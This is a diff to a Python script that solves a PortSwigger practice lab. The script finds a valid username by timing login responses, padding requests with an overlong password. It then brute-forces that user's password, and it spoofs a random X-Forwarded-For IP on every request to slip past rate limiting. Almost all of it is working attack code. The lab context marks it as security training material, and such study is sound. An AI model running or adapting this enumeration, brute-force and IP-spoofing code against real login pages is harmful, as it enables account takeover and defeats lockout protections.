@@ -4,7 +4,7 @@
 #
 # Date: 25/8/2023
 #
-# PortSwigger LAB: Username enumeration via different responses
+# PortSwigger LAB: Username enumeration response timing
 #
 # Steps: 1. enum usernames to get a valid one
 #        2. brute force the valid username password
@@ -13,12 +13,12 @@
 
 # imports
 import requests
-import re
+import random
 import time
 from colorama import Fore
 
 # change this to your lab URL
-url = "https://0a20003b049712f885c31a4200d50024.web-security-academy.net/login"
+url = "https://0a4b00af03053a4d827e3849007d003b.web-security-academy.net/login"
 # change the paths to your lists
 usernames = open("/home/ahmed/users", 'rt').read().splitlines()
 passwords = open("/home/ahmed/passwords",
@@ -31,6 +31,17 @@ FAILED_USERS = []
 FAILED_USERS_COUNTER = 0
 FAILED_PASSWORDS = []
 FAILED_PASSWORDS_COUNTER = 0
+
+
+#########################################
+# Function to get random IP on each call
+#########################################
+def get_random_ip():
+    a = random.randint(2, 254)
+    b = random.randint(2, 254)
+    c = random.randint(2, 254)
+    d = random.randint(2, 254)
+    return f"{a}.{b}.{c}.{d}"
 
 
 #####################################
@@ -52,7 +63,12 @@ def get_valid_user(start_time, url, usernames):
     for index, user in enumerate(usernames):
         data = {
             "username": user,
-            "password": "no important now"
+            # big random password to take longer time in checking in the server
+            "password": "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw"
+        }
+        headers = {
+            # change IP for every request to avoid blocking
+            "X-Forwarded-For": get_random_ip()
         }
         # calculate elapsed time
         elapsed_time = (int((time.time() - start_time) / 60))
@@ -61,14 +77,12 @@ def get_valid_user(start_time, url, usernames):
                        index, total_users, user)
         try:  # try to send a login request
             response = requests.post(
-                url, data, allow_redirects=False, timeout=5)
-            if response.status_code == 200:
-                check_pattern = re.findall(
-                    "Invalid username", response.text)  # search for pattern
-                if len(check_pattern) == 0:  # if pattern not found
-                    return user  # valid user
-                else:
-                    continue
+                url=url, data=data, headers=headers, allow_redirects=False, timeout=10)
+            # if response take more than 5 seconds to complete
+            if response.status_code == 200 and response.elapsed.seconds > 5:
+                return user  # valid user
+            else:
+                continue
         except:
             FAILED_USERS_COUNTER += 1  # update the fail counter
             # save the failed username to try it later
@@ -95,9 +109,13 @@ def brute_force_password(start_time, url, valid_user, passwords):
             "username": valid_user,
             "password": password
         }
+        headers = {
+            # change IP for every request to avoid blocking
+            "X-Forwarded-For": get_random_ip()
+        }
         try:  # try to login
             response = requests.post(
-                url, data, allow_redirects=False, timeout=5)
+                url=url, data=data, headers=headers, allow_redirects=False, timeout=5)
             if response.status_code == 302:  # valid password
                 return password
             else:
